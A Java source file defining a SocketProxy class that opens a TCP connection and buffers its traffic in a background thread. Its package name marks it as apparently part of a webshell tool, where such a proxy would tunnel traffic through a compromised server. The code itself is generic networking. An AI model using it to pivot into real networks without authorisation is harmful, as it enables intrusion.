package webshell.util;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class SocketProxy {

	private Socket socket;
	private InputStream in;
	private OutputStream out;

	private byte[] buffer = new byte[1024 * 1024];
	private int bufferPos = 0;
	private Thread bufferThread;
	private boolean bufferEOF;

	private long lastUsedTime = System.currentTimeMillis();
	private boolean closed = false;

	public SocketProxy(String host, int port) throws IOException {
		socket = new Socket(host, port);
		in = socket.getInputStream();
		out = socket.getOutputStream();
		bufferThread = new Thread() {
			@Override
			public void run() {
				while (true) {
					try {
						int len = buffer();
						if (len < 0) {
							bufferEOF = true;
							break;
						}
						if (closed) {
							break;
						}
					} catch (Exception e) {
						e.printStackTrace();
						break;
					}
				}
			}
		};
		bufferThread.setName("socket-buffer[" + host + ":" + port + "]");
		bufferThread.setDaemon(true);
		bufferThread.start();
	}

	public void write(byte[] data) throws IOException {
		out.write(data);
		lastUsedTime = System.currentTimeMillis();
	}

	public void closeOutput() throws IOException {
		out.close();
		lastUsedTime = System.currentTimeMillis();
	}

	public byte[] readBuffer() throws IOException {
		synchronized (buffer) {
			byte[] data = new byte[bufferPos];
			System.arraycopy(buffer, 0, data, 0, bufferPos);
			bufferPos = 0;
			lastUsedTime = System.currentTimeMillis();
			return data;
		}
	}

	public void close() throws IOException {
		closed = true;
		out.close();
		in.close();
		socket.close();
	}

	public boolean isBufferEOF() {
		return bufferEOF;
	}

	public long getLastUsedTime() {
		return lastUsedTime;
	}

	public boolean isClosed() {
		return closed;
	}

	private int buffer() throws IOException {
		byte[] buf = new byte[1024];
		int len = in.read(buf);
		if (len > 0) {
			while (true) {
				synchronized (buffer) {
					int remaining = buffer.length - bufferPos;
					if (len <= remaining) {
						System.arraycopy(buf, 0, buffer, bufferPos, len);
						bufferPos += len;
						break;
					}
				}
				if (closed) {
					break;
				}
				try {
					Thread.sleep(500);
				} catch (InterruptedException e) {
				}
			}
		}
		return len;
	}

}
